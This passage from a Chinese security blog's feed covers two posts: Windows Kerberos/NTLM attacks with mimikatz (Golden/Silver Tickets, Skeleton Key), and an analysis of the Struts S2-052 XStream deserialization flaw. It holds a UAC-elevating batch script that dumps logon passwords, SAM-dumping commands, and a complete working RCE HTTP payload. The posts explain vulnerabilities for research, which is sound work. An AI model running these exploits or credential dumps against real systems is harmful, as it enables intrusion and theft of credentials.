扫描</h3></li><li>Kerberos是一种支持票证身份验证的安全协议。如果客户端计算机身份验证请求包含有效的用户凭据和服务主体名称 (SPN)，则 Kerberos 身份验证服务器将授予一个票证以响应该请求。然后，客户端计算机使用该票证来访问网络资源。在内部网络中，SPN扫描通过 查询向域控制器执行服务发现。这对于红队而言，可以帮助他们识别正在运行重要服务的主机，如终端、交换机、微软SQL等，并隐藏他们。此外，SPN的识别也是kerberoasting攻击的第一步。<h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3></li><li>先假设这么一种情况,原先已拿到的域内所有的账户hash,包括krbtgt这个账户,由于有些原因导致域管权限丢失,但好在你还有一个普通域用户权限,碰巧管理员在域内加固时忘记重置krbtgt密码,基于此条件,我们还能利用该票据重新获得域管理员权限,利用krbtgt的HASH值可以伪造生成任意的TGT(mimikatz),能够绕过对任意用户的账号策略,让用户成为任意组的成员,可用于Kerberos认证的任何服务.</li><li>在后渗透阶段，攻击者一般会导出golden ticket，当在“丢失”域控权限的时候(比如修改了域管的账号密码但没有修改krbtgt账号密码)就可以通过注入golden ticket的方式再次拿下并控制域控服务器。注：这个时候需要一台域内或者域外机器(域外机器需要配置dns为域控或域内dns服务器)，此外由于票据中都是以域名为区分的，所以在利用的时候也应该使用域名，而不能是IP地址。</li><li>说到底还是利用了krbtgt的密码不发生改变的特性。<h3 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h3></li><li>通过观察Kerberos协议的认证过程不难发现,如果我们获取了Server秘钥Ks(服务器口令散列值),就可以跳过KDC的认证，直接伪造票据和目标Server通信<h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><a href="https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1" target="_blank" rel="noopener">Attacking Kerberos</a>.pdf)<br><a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener">kerberoast</a><h2 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h2><a href="http://smartechverse.blogspot.com/2015/06/crack-windows-admin-password-and-sam.html" target="_blank" rel="noopener">Crack windows Admin Password and Sam Files</a><br><a href="http://davenport.sourceforge.net/ntlm.html" target="_blank" rel="noopener">The NTLM Authentication Protocol and Security Support Provider</a><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><h3 id="内存导出"><a href="#内存导出" class="headerlink" title="内存导出"></a>内存导出</h3><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/procdump.png" alt=""></li><li>从本地获取密码<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/mimikatzdmp.png" alt=""></li><li>自动获取内存密码bat脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">&gt;nul 2&gt;&amp;1 &quot;%SYSTEMROOT%\system32\cacls.exe&quot; &quot;%SYSTEMROOT%\system32\config\system&quot;</span><br><span class="line">if &apos;%errorlevel%&apos; NEQ &apos;0&apos; (</span><br><span class="line">goto UACPrompt</span><br><span class="line">) else ( goto gotAdmin )</span><br><span class="line">:UACPrompt</span><br><span class="line">echo Set UAC = CreateObject^(&quot;Shell.Application&quot;^) &gt; &quot;%temp%\getadmin.vbs&quot;</span><br><span class="line">echo UAC.ShellExecute &quot;%~s0&quot;, &quot;&quot;, &quot;&quot;, &quot;runas&quot;, 1 &gt;&gt; &quot;%temp%\getadmin.vbs&quot;</span><br><span class="line">&quot;%temp%\getadmin.vbs&quot;</span><br><span class="line">exit /B</span><br><span class="line">:gotAdmin</span><br><span class="line">if exist &quot;%temp%\getadmin.vbs&quot; ( del &quot;%temp%\getadmin.vbs&quot; )</span><br><span class="line">pushd &quot;%CD%&quot;</span><br><span class="line">CD /D &quot;%~dp0&quot;</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt</span><br></pre></td></tr></table></figure></li></ul><h3 id="mimikatz-skeleton-key"><a href="#mimikatz-skeleton-key" class="headerlink" title="mimikatz skeleton key"></a>mimikatz skeleton key</h3><ul><li>这个主要用于域控权限维持。</li><li>Skeleton Key被安装在64位的域控服务器上，支持Windows Server2003—Windows Server2012 R2，能够让所有域用户使用同一个万能密码进行登录，现有的所有域用户使用原密码仍能继续登录，重启后失效。</li><li>可以试试你们的域控是不是已经安装这个后门了哦；）<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/mimikatzskeleton.png" alt=""><br><a href="https://www.youtube.com/watch?v=3gnZ4e1T_cs" target="_blank" rel="noopener">视频链接</a><h3 id="mimikatz-绕过cmd、regedit、taskmgr限制"><a href="#mimikatz-绕过cmd、regedit、taskmgr限制" class="headerlink" title="mimikatz 绕过cmd、regedit、taskmgr限制"></a>mimikatz 绕过cmd、regedit、taskmgr限制</h3></li><li>如果管理员禁用了cmd、regedit、taskmgr的话，可以分别使用misc::cmd、<br>misc::regedit、misc::taskmgr进行绕过。<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/mimikatzrestrictionbypass.png" alt=""><h3 id="dump-sam"><a href="#dump-sam" class="headerlink" title="dump sam"></a>dump sam</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::whoami</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/lsadumpsam.png" alt=""></p><h2 id="other-1"><a href="#other-1" class="headerlink" title="other"></a>other</h2><ul><li>建议有时间精力可以读读mimikatz的源码。<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2></li><li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ee663293(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/windows/desktop/ee663293(v=vs.85).aspx</a></li><li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa378749(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/windows/desktop/aa378749(v=vs.85).aspx</a></li><li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa378747(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/windows/desktop/aa378747(v=vs.85).aspx</a></li><li><a href="http://blog.csdn.net/qq_26886929/article/details/53905654" target="_blank" rel="noopener">http://blog.csdn.net/qq_26886929/article/details/53905654</a></li><li><a href="http://blog.csdn.net/wulantian/article/details/42418231" target="_blank" rel="noopener">http://blog.csdn.net/wulantian/article/details/42418231</a></li><li><a href="https://github.com/gentilkiwi/mimikatz/wiki" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki</a><br><a href="https://room362.com/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/" target="_blank" rel="noopener">USING MIMIKATZ ALPHA OR GETTING CLEAR TEXT PASSWORDS WITH A MICROSOFT TOOL</a><br><a href="http://www.vuln.cn/6816" target="_blank" rel="noopener">域渗透——Skeleton Key – 三好学生</a><br><a href="https://blogs.msdn.microsoft.com/apgcdsd/2011/09/26/kerberosntlm-sql-server/" target="_blank" rel="noopener">Kerberos和NTLM – SQL Server连接的那点事</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>struts-052和struts-053分析</title>
      <link href="/2017/09/17/struts-052%E5%92%8Cstruts-053%E5%88%86%E6%9E%90/"/>
      <url>/2017/09/17/struts-052%E5%92%8Cstruts-053%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>漏洞爆发的那几天有事(主要还是懒)没有及时的跟进漏洞，这两天跟一下漏洞。</p><h4 id="s2-052"><a href="#s2-052" class="headerlink" title="s2-052"></a>s2-052</h4><p><a href="struts2-rest-showcase.war">漏洞war包下载</a><br><a href="https://cwiki.apache.org/confluence/display/WW/S2-052" target="_blank" rel="noopener">官方通告</a><br>在分析这个漏洞之前，先补补基础知识。<br><br>了解一下xstream这个包，看一下官方的一句话介绍，XStream is a simple library to serialize objects to XML and back again.就是一个序列化java对象为xml以及将xml反序列化为java对象。<br><br>我之前分析过json序列化和反序列化时常用的几种方法，今天我也学习一下xml序列化和反序列化的方法，目前来说有两种，一种是XMLDecoder，另外一种是xstream，xstream使用的比较早的多，然后这次的s2-052就是利用的xstream。<br><br><br>xstream反序列化的问题由来已久，早在四年前，老外就在defcon中讲述了这个问题<a href="https://www.youtube.com/watch?v=L6gXSiGtoqg" target="_blank" rel="noopener">link</a>，而且之前jenkins的反序列化漏洞也是和xstream有关。<br><br><img src="/2017/09/17/struts-052和struts-053分析/xmlGenMain.png" alt=""><br>我们可以看到，通过XMLGenerator.generateXML的方法就进行了序列化，而通过XMLGenerator.generateTOfromXML就进行了反序列化。这个XMLGenerator类的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import com.thoughtworks.xstream.XStream;</span><br><span class="line">import com.thoughtworks.xstream.io.xml.DomDriver;</span><br><span class="line"></span><br><span class="line">public final class XMLGenerator &#123;</span><br><span class="line">/*</span><br><span class="line"> * this class is for generating XML </span><br><span class="line"> */</span><br><span class="line"> </span><br><span class="line"> /*</span><br><span class="line">  * initialization of XStream class </span><br><span class="line">  */</span><br><span class="line"> private static XStream xstream = new XStream(new DomDriver())</span><br><span class="line"> &#123;&#123;</span><br><span class="line">  processAnnotations(Square.class);</span><br><span class="line">  processAnnotations(Rectangle.class);</span><br><span class="line"> &#125;&#125;;</span><br><span class="line"> </span><br><span class="line"> /*</span><br><span class="line">  * This class is for generating XML from MODEL class</span><br><span class="line">  * @param Object</span><br><span class="line">  * @return String </span><br><span class="line">  */</span><br><span class="line"> public static String generateXML(Object to) &#123;</span><br><span class="line">  return null == to ? &quot;&quot; : xstream.toXML(to);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> /*</span><br><span class="line">  * Generates the transfer object from the given XML using XStream.</span><br><span class="line">  * </span><br><span class="line">  * @param String</span><br><span class="line">  * @return transfer object</span><br><span class="line">  */</span><br><span class="line"> public static Object generateTOfromXML(String xml) &#123;</span><br><span class="line">  return xstream.fromXML(xml);</span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里就用到了XStream。<br>现在我们再来看一下这样的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import com.thoughtworks.xstream.XStream;</span><br><span class="line">import com.thoughtworks.xstream.io.xml.DomDriver;</span><br><span class="line"></span><br><span class="line">public class xstreamPOC &#123;</span><br><span class="line"></span><br><span class="line">public static void main(String[] args) </span><br><span class="line">&#123;</span><br><span class="line">//String payload = &quot;&lt;square&gt;&quot;+ </span><br><span class="line">// &quot;&lt;size&gt;5&lt;/size&gt;&quot;+</span><br><span class="line">// &quot;&lt;/square&gt; &quot;;</span><br><span class="line">String payload = &quot;&lt;string&gt;&quot;+ </span><br><span class="line"> &quot;hello&quot;+</span><br><span class="line">  &quot;&lt;/string&gt; &quot;;</span><br><span class="line"></span><br><span class="line">String inputXML = payload;</span><br><span class="line"></span><br><span class="line">//Square sq1 = (Square)XMLGenerator.generateTOfromXML(inputXML);</span><br><span class="line">//the next code is what the XMLGenerator.generateTOfromXML is doing:</span><br><span class="line">XStream xstream = new XStream(new DomDriver())</span><br><span class="line">&#123;&#123;</span><br><span class="line">processAnnotations(Square.class);</span><br><span class="line">processAnnotations(Rectangle.class);</span><br><span class="line">&#125;&#125;;</span><br><span class="line">Square sq1 = (Square)xstream.fromXML(inputXML);</span><br><span class="line"></span><br><span class="line">System.out.println(String.format(&quot;sq1: \n \n%s \n\n&quot;, sq1));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2017/09/17/struts-052和struts-053分析/xstreamstring.png" alt=""><br>从上图可以看到，当我在序列化一个包含有string关键字的xml时候，他会首先产生一个string的类，然后强制转换成Square类。危险就出现在这里了，XStream将创建定义在xml中的对象。<br><br>那么如果我们换成下面的payload呢<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String payload = &quot;&lt;java.lang.ProcessBuilder&gt;&quot;+ </span><br><span class="line"> &quot;     &lt;command&gt;ExecuteMe&lt;/command&gt;&quot;+</span><br><span class="line"> &quot;&lt;/java.lang.ProcessBuilder&gt;&quot;;</span><br></pre></td></tr></table></figure></p><p><img src="/2017/09/17/struts-052和struts-053分析/stringsExec.png" alt=""><br>可以看到我们就会实例化这个ProcessBuilder这个类。但是呢，目前为止我们还是只能创建对象，并不能invoke它们，所以这个时候就需要动态代理和EventHandle这两个技巧了。<br>看下面这样的代码，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import java.beans.EventHandler;</span><br><span class="line">import java.util.Set;</span><br><span class="line">import java.util.TreeSet;</span><br><span class="line"></span><br><span class="line">public class XStreamPoC &#123;</span><br><span class="line"></span><br><span class="line">public static void main(String[] args) </span><br><span class="line">&#123;</span><br><span class="line">Set&lt;Comparable&gt; set = new TreeSet&lt;Comparable&gt;();</span><br><span class="line">        set.add(&quot;foo&quot;);</span><br><span class="line"></span><br><span class="line">        set.add(EventHandler.create(Comparable.class, </span><br><span class="line">        new ProcessBuilder(&quot;open&quot;,&quot;/Applications/Calculator.app&quot;), &quot;start&quot;));</span><br><span class="line"></span><br><span class="line">        String setXml = XMLGenerator.generateXML(set);</span><br><span class="line">/*String payload = &quot;&lt;java.lang.ProcessBuilder&gt;&quot;+ </span><br><span class="line"> &quot;     &lt;command&gt;ExecuteMe&lt;/command&gt;&quot;+</span><br><span class="line"> &quot;&lt;/java.lang.ProcessBuilder&gt;&quot;;</span><br><span class="line"></span><br><span class="line">String inputXML = payload;</span><br><span class="line"></span><br><span class="line">Square sq1 = (Square)XMLGenerator.generateTOfromXML(inputXML);</span><br><span class="line">//Object sq1 = XMLGenerator.generateTOfromXML(inputXML);</span><br><span class="line"></span><br><span class="line">System.out.println(String.format(&quot;sq1 value: %s \n\nsq1 class: %s&quot;, sq1, sq1.getClass()));</span><br><span class="line"> */</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2017/09/17/struts-052和struts-053分析/technique.png" alt=""><br>如上图所示，可以看到当转换发生异常的时候,就会执行start的操作。<br>介于此，我们的payload就可以这么写了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">public class PoC_XMLGenerator &#123;</span><br><span class="line"></span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">// TODO Auto-generated method stub</span><br><span class="line"></span><br><span class="line">String process = &quot;open&quot;; </span><br><span class="line">String arguments = &quot;/Applications/Calculator.app&quot;;</span><br><span class="line"></span><br><span class="line">String payload = &quot;&lt;sorted-set&gt;&quot; +  </span><br><span class="line"> //&quot;&lt;string&gt;foo&lt;/string&gt;&quot; +</span><br><span class="line"> &quot;&lt;dynamic-proxy&gt;&quot; + </span><br><span class="line"> &quot;&lt;interface&gt;java.lang.Comparable&lt;/interface&gt;&quot; +</span><br><span class="line"> &quot;&lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;&quot; +</span><br><span class="line"> &quot;    &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;&quot; +</span><br><span class="line"> &quot;         &lt;command&gt;&quot; +</span><br><span class="line"> &quot;             &lt;string&gt;&quot; + process + &quot;&lt;/string&gt;&quot; +</span><br><span class="line"> &quot;             &lt;string&gt;&quot; + arguments + &quot;&lt;/string&gt;&quot; +</span><br><span class="line"> &quot;        &lt;/command&gt;&quot; +</span><br><span class="line"> &quot;    &lt;/target&gt;&quot; +</span><br><span class="line"> &quot;    &lt;action&gt;start&lt;/action&gt;&quot; +</span><br><span class="line"> &quot;&lt;/handler&gt;&quot; + </span><br><span class="line"> &quot;&lt;/dynamic-proxy&gt;&quot; + </span><br><span class="line">&quot;&lt;/sorted-set&gt;&quot;;</span><br><span class="line"></span><br><span class="line">XMLGenerator.generateTOfromXML(payload);</span><br><span class="line"></span><br><span class="line">System.out.println(&quot;Will not get here&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>至此，XStream的利用点分析完了。下面再来看看struts2中的利用。<br><br>通过官方的一句话公告 A RCE attack is possible when using the Struts REST plugin with XStream handler to deserialise XML requests可以看出问题出在struts rest plugin，这个REST插件struts2-rest-plugin.jar用到了XStreamHandler这个类，这个类对http请求中content-type是application/xml的，会调用XStream进行处理。<br><img src="/2017/09/17/struts-052和struts-053分析/s2rest.png" alt=""><br>可以看到，当contenttype为xml的时候的处理类是XStreamHandler。那么我们就可以将恶意代码以xml为载体，通过Content-type为xml的方式，让XStreamHandler去进行序列化，那么这个时候就会触发漏洞。<br><br>最终payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">POST /struts2-rest-showcase/orders/3 HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 2430</span><br><span class="line"></span><br><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command&gt;</span><br><span class="line">                        &lt;string&gt;open&lt;/string&gt;</span><br><span class="line">                        &lt;string&gt;/Applications/Calculator.app&lt;/string&gt;</span><br><span class="line">                      &lt;/command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                    &lt;/next&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                &lt;/serviceIterator&gt;</span><br><span class="line">                &lt;lock/&gt;</span><br><span class="line">              &lt;/cipher&gt;</span><br><span class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2017/09/17/struts-052和struts-053分析/exp.png" alt=""></p><ul><li>补丁对比<br><a href="https://github.com/apache/struts/commit/19494718865f2fb7da5ea363de3822f87fbda264" target="_blank" rel="noopener">补丁代码</a><h4 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h4></li><li>关于s2-053的漏洞问题是安全编码和习惯的问题,而非struts2通杀漏洞。<br><br><a href="http://struts.apache.org/docs/s2-053.html" target="_blank" rel="noopener">官方通告</a><br><img src="/2017/09/17/struts-052和struts-053分析/s2-053.png" alt=""></li><li>较s2-052，s2-053漏洞更简单和直接。<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li><li><del>我还是喜欢用eclipse分析java漏洞。</del>，还是好像还是idea比较好用啊，只是从eclipse切换过来略蛋疼。切换过来之后，你会发现你的ide好像都要是JetBrains这个公司的了。</li><li>基础还是不够牢固，给自己定个小计划，后面有时间把所有的s2漏洞分析一下。总结一下思路。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li><li>Standard way to serialize and deserialize Objects with XStream<br><a href="http://blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html#.Wb6sFdMjE0o" target="_blank" rel="noopener">http://blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html#.Wb6sFdMjE0o</a></li><li>一步一步的构造payload<br><a href="https://gist.github.com/DinisCruz/8077118#file-1-poping-a-calculator-on-osx-using-xmlgenerator-xstream-based-api-java" target="_blank" rel="noopener">https://gist.github.com/DinisCruz/8077118#file-1-poping-a-calculator-on-osx-using-xmlgenerator-xstream-based-api-java</a></li><li>XStream “Remote Code Execution” exploit on code from “Standard way to serialize and deserialize Objects with XStream” article<br><a href="http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html?m=1" target="_blank" rel="noopener">http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html?m=1</a></li><li>Struts2 S2-052 RCE分析与利用<br><a href="https://paper.seebug.org/383/" target="_blank" rel="noopener">https://paper.seebug.org/383/</a></li><li>CVE-2017-9805:Struts2 REST插件远程执行命令漏洞(S2-052) 分析报告<br><a href="https://yq.aliyun.com/articles/197926" target="_blank" rel="noopener">https://yq.aliyun.com/articles/197926</a></li><li>S2-052漏洞分析及官方缓解措施无效验证<br><a href="http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/" target="_blank" rel="noopener">http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/</a></li><li>Struts2 S2-052漏洞分析<br><a href="https://www.waitalone.cn/struts2-s2-052.html" target="_blank" rel="noopener">https://www.waitalone.cn/struts2-s2-052.html</a></li><li>Struts2-052漏洞分析<br><a 